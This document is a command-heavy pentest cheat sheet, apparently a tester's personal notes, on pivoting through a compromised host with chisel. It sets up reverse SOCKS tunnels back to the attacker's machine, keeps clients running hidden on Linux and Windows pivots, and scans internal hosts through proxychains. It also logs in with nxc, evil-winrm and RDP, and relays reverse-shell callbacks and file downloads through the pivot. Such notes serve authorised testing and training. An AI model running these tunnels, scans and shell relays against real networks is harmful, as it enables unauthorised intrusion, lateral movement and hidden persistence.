# Pivoting with chisel

## The server on Kali
At the pwn-broker prompt:
tool install chisel
chisel server -p 8000 --reverse
- [ ] serve takes 8000 too when it runs without root: then another port here and in every client line
- [ ] Outbound 8000 blocked: a port the network lets out, such as 443, which needs root
sudo /opt/pwn-broker/bin/chisel server -p 443 --reverse
- [ ] A shared network: --auth tunnel:THE-SECRET on the server and on each client

## The client on the pivot
At the pwn-broker prompt, for the line that fetches it:
serve
serve files chisel
- [ ] The same version at both ends: pwn-shop's chisel and chisel.exe, not another download
On a Linux pivot:
chmod +x chisel
./chisel client <LHOST>:8000 R:socks
On a Windows pivot:
.\chisel.exe client <LHOST>:8000 R:socks
- [ ] The server prints a session line ending proxy#R:127.0.0.1:1080=>socks: Listening
To keep it running after my shell closes, on Linux, then on Windows:
nohup ./chisel client <LHOST>:8000 R:socks >/dev/null 2>&1 &
Start-Process -WindowStyle Hidden .\chisel.exe -ArgumentList 'client <LHOST>:8000 R:socks'

## Proxychains
R:socks is a SOCKS5 proxy on Kali's 127.0.0.1:1080. Kali's default Tor line swapped for it:
sudo sed -i 's/^socks4.*9050$/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
tail -3 /etc/proxychains4.conf
- [ ] strict_chain and proxy_dns on, near the top of the file
- [ ] Quicker scans: tcp_read_time_out 1000 and tcp_connect_time_out 500 in the same file
- [ ] R:1081:socks for a second proxy on another port

## Work through the proxy
Connect scans only, with no ping, on a short list of ports:
proxychains -q nmap -sT -Pn -p 21,22,80,135,139,443,445,1433,3306,3389,5985 <InternalIP>
Windows hosts on the network, from a TCP connection to 445:
proxychains -q nxc smb <Subnet>/<CIDR>
proxychains -q nxc smb <InternalIP> -u '<Username>' -p '<Password>'
proxychains -q evil-winrm -i <InternalIP> -u '<Username>' -p '<Password>'
proxychains -q xfreerdp3 /v:<InternalIP> /u:'<Username>' /p:'<Password>' /cert:ignore
proxychains -q curl http://<InternalIP>/
- [ ] -sT and -Pn every time: SYN scans, UDP and ping do not cross a SOCKS proxy
- [ ] Browser: FoxyProxy set to SOCKS5 127.0.0.1 1080, or Burp's SOCKS proxy under Settings, Network, Connections

## One port instead
On the pivot, an internal service on a port of Kali:
./chisel client <LHOST>:8000 R:<LPORT>:<InternalIP>:<Port>
.\chisel.exe client <LHOST>:8000 R:<LPORT>:<InternalIP>:<Port>
A service on the pivot's own localhost:
./chisel client <LHOST>:8000 R:<LPORT>:127.0.0.1:<Port>
Then from Kali, with no proxychains:
nc -nv 127.0.0.1 <LPORT>
- [ ] Several forwards fit in one client line, one after another, and R:socks with them

## Callbacks from the internal network
A forward without R: listens on the pivot and connects out from Kali's side. The pivot's port to my listener:
./chisel client <LHOST>:8000 0.0.0.0:<LPORT>:127.0.0.1:<LPORT>
rlwrap nc -lvnp <LPORT>
- [ ] The payload goes to the pivot's address on <Subnet>/<CIDR>, <PivotInternalIP>, on <LPORT>: :Pb shells
For files, the pivot's 8080 to serve's port, which is 80 as root and 8000 otherwise:
./chisel client <LHOST>:8000 0.0.0.0:8080:<LHOST>:80
- [ ] The line serve files prints, with <LHOST> changed to <PivotInternalIP>:8080
- [ ] A Windows pivot's firewall lets the port in: the rule in :Pb port-forwarding

## Afterwards
- [ ] The client stopped on the pivot and its file removed
- [ ] The server stopped on Kali with Ctrl+C
